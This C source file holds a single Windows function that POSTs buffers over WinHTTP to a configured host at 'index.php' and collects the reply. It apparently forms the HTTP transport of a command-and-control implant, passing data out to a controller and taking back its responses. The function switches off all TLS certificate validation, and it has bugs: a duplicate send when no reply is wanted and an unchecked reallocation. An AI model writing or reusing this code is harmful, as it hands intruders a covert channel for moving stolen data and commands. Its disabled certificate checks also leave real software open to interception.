#include "Transport.h"
#include <winhttp.h>
#include <stdio.h>

extern TRANSPORT_CFG g_TransportCfg;

BOOL TransportSend(LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize){
    HINTERNET   hSession    = NULL;
    HINTERNET   hConnect    = NULL;
    HINTERNET   hRequest    = NULL;
    DWORD       dwFlags     = 0;
    UCHAR       tmp[1024]   = { 0 };
    DWORD       dwRead      = 0;
    PVOID       resp        = NULL;
    SIZE_T      respSz      = 0;
    BOOL        ok          = FALSE;

    hSession = WinHttpOpen(g_TransportCfg.UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto cleanup;

    hConnect = WinHttpConnect(hSession, g_TransportCfg.Host, g_TransportCfg.Port, 0);
    if (!hConnect) goto cleanup;

    dwFlags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
    if (g_TransportCfg.Secure)
        dwFlags |= WINHTTP_FLAG_SECURE;

    hRequest = WinHttpOpenRequest(hConnect, L"POST", L"index.php", NULL, NULL, NULL, dwFlags);
    if (!hRequest) goto cleanup;

    if (g_TransportCfg.Secure){
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                         SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(DWORD));
    }

    if (!WinHttpSendRequest(hRequest, NULL, 0, Data, Size, Size, 0)){
        g_TransportCfg.Secure = FALSE; // reset on failure (connection lost indicator)
        goto cleanup;
    }

    if (RecvData && WinHttpReceiveResponse(hRequest, NULL)){
        do {
            ok = WinHttpReadData(hRequest, tmp, sizeof(tmp), &dwRead);
            if (!ok || dwRead == 0) break;

            if (!resp)
                resp = LocalAlloc(LPTR, dwRead);
            else
                resp = LocalReAlloc(resp, respSz + dwRead, LMEM_MOVEABLE | LMEM_ZEROINIT);

            memcpy((PUCHAR)resp + respSz, tmp, dwRead);
            respSz += dwRead;
            memset(tmp, 0, sizeof(tmp));

        } while (ok);

        if (RecvSize) *RecvSize = respSz;
        *RecvData = resp;
        ok = TRUE;
    }
    else if (!RecvData){
        WinHttpSendRequest(hRequest, NULL, 0, Data, Size, Size, 0);
        ok = TRUE;
    }

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return ok;
}
